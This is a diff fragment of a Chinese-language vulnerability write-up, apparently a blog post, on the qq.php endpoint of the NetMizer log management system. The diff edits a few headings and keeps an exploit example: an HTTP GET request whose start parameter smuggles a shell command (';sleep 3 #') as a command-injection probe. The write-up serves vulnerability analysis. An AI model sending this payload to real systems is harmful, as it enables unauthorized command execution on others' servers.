@@ -20,14 +20,6 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 # 漏洞分析
 
-深入探索
-
-Database
-
-漏洞分析报告
-
-漏洞修复方案
-
 看下 `qq.php` 业务实现关键逻辑部分
 
 ```
@@ -88,7 +80,7 @@ Database
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-孚盟云漏洞
+软件
 
 ```
 GET /data/search/qq.php?action=file&start=1;sleep+3+%23+ HTTP/1.1
